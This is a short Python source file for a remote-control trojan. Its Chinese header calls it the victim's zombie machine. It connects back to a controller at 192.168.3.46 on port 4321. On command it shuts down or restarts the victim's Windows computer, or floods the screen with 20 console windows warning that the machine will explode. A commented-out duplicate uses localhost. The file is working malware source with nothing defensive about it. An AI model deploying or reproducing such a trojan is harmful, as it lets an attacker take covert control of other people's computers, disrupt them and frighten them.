# 木马 受害者的肉鸡
import time, os
from socket import*




s = socket()

while True:
    try:
        s.connect(('192.168.3.46', 4321))
        break
    except:
        time.sleep(2)

while True:
    # print("1\n")
    while True:
        cmd = s.recv(1024).decode()
        if cmd == 'shutdown':
            os.system('shutdown -s -t 60')
            s.send('byebye'.encode())
            break
        elif cmd == 'restart':
            os.system('shutdown -r -t 60')
            s.send('byebye'.encode())
            break
        elif cmd == 'warning':
            for i in range(20):
                os.system(f'start cmd /k echo 【警告第{i+1}次】此电脑即将爆炸，请速远离！】')
            s.send('byebye'.encode())
            break

























# s = socket()                    # 1.创建一个套接字
# while True:                     # 循环
#     try:                        # 尝试
#         s.connect(('127.0.0.1', 4321))  # 2.申请连接后台
#         break
#     except: time.sleep(2)
#
# while True:
#     cmd = s.recv(1024).decode()  # 接收指令
#     if cmd == 'shutdown':
#         os.system('shutdown -s -t 60')  # 1s
#         s.send('byebye'.encode())
#         break
#     elif cmd == 'restart':
#         os.system('shutdown -r -t 60')  # 1s重启
#         s.send('byebye'.encode())
#         break
#     elif cmd == 'warning':
#         for i in range(20):  # 循环20次
#             os.system(f'start cmd /k echo 【警告第{i+1}次】此电脑即将爆炸，请速远离！')
#         s.send('byebye'.encode())
#         break

















